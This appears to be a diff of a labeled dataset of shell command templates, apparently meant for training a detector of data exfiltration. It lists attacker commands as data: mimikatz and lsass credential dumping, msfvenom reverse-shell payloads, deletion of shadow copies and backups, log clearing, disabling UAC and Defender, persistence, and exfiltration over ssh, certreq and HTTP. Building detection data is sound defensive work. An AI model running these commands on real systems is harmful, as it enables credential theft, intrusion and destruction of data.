@@ -25,36 +25,30 @@
 1	cat ${source_file_path} | ssh ${username}@${ip_address} 'cat > ${destination_file_path}'
 1	scp -r ${source_directory} ${username}@${ip_address}:${destination_directory}
 1	CertReq -Post -config ${destination_file_path} ${source_file_path}
-1	sftp ${username}@${ip_address}:${destination_file_path} <<< $"put ${source_file_path}"
-1	certreq.exe -Post -config ${destination_file_path} c:\windows\win.ini ${source_file_path}
-1	Invoke-RestMethod -Uri ${ip_address}:${port} -Method Post -InFile ${source_file_path} -ContentType "multipart/form-data"
-0	powershell -c "sync -avz ${source_file_path} ${destination_file_path}"
-0	putty -ssh ${username}@${ip_address} -pw ${password}
-0	7z a archive.7z ${source_file_path}
-0	mimikatz.exe "sekurlsa::minidump lsassdump.dmp" "sekurlsa::logonpasswords full" exit
-0	wbadmin delete systemstatebackup -keepVersions:0
-0	powershell -c "bitsadmin.exe /transfer download /Priority HIGH ${source_file_path} ${destination_file_path}"
-0	tar -cvfW archive.tar ${source_directory}
-0	cmd.exe /c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
-0	msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v ${value_name} /t REG_DWORD /d ${value}
-0	zip -r archive.zip ${source_directory}
-0	powershell -c "choco install -y 7zip"
 0	net.exe stop ${service_name} && sc.exe config ${service_name} start=disabled
-0	wbadmin delete catalog -quiet
-0	wbadmin delete systemstatebackup -keepVersions:0
-0	schtasks /create /tn win32times /sc onstart /ru system /tr "${command_to_execute}"
-0	procdump -ma lsass.exe lsassdump.dmp
-0	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d "${command_to_execute}" /f
-0	powershell -c "choco install -y 7zip"
-0	mstsc /v:${ip_address} /f
-0	cmd.exe /c "taskkill.exe /f /im ${process_name}"
-0	powershell -c "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
-0	powershell -c "wmic /node:"${ip_address}" shadowcopy call create Volume=C:"
-0	red add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
-0	copy ${source_file_path} \\${ip_address}\${destination_file_path}
+0	[System.Environment]::UserName
+0	sftp  ${username}@${ip_address}:${source_file_path} ${destination_file_path}
+0	plink -ssh ${ip_address} -l ${username} -pw ${password}
+0	wmic shadowcopy call create Volume=C:
+0	whoami /all
+0	xcopy ${source_file_path} \\${ip_address}\${destination_file_path} /Y
+0	wevtutil cl application
+0	powershell -c "scp ${username}@${ip_address}:${destination_file_path} ${source_file_path}"
+0	dir ${source_file_path} -Recurse | Compress-Archive -DestinationPath ${destination_file_path}
 0	powershell -c "cipher.exe /w:C:"
-0	cmd.exe /c "choco install 7zip"
-0	reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-0	7z a archive.7z ${source_directory}
-0	tar -cvfW archive.tar ${source_directory}
+0	cmd.exe /c "curl ${source_file_path} -o $ ${destination_file_path}"
+0	tar -zcvf archive.tar.gz ${source_directory}
+0	SharpRDP.exe computername=${ip_address} command=${command_to_execute} username=${domain}\${username} password=${password}
+0	powershell -c "cipher.exe /w:C:"
+0	cmd.exe /c "vssadmin.exe delete shadows /all /quiet"
+0	msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	del /f ${local_file_path}
+0	rcat connect -s sh ${ip_address} ${port}
+0	powershell -c  "procdump -ma lsass.exe lsassdump.dmp"
+0	qwinsta.exe /server:${computer_name}
+0	zip -r archive.zip ${source_directory}
+0	powershell -c "cipher.exe /w:C:"
+0	wscript "${jscript}"
+0	Remove-Item -path ${local_file_path}
+0	nc -l ${ip_address} ${port}
+0	msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
